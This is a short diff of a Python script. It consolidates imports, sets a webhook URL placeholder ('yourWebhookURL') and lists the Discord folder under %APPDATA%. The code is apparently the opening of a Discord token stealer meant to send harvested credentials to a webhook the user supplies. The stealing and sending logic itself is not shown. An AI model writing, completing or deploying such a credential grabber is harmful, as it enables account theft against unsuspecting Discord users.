@@ -1,13 +1,9 @@
-import requests
-import os
-import glob
-import re
-import time
-import getpass
+import requests, os, glob, re, time, getpass, platform, datetime
 from os import remove
 from sys import argv
 
-WEBHOOK = "WEBHOOK URL HERE"
+WEBHOOK = "yourWebhookURL"
+
 appdatapath = os.getenv('APPDATA')
 paths = [
    appdatapath + '\\Discord',
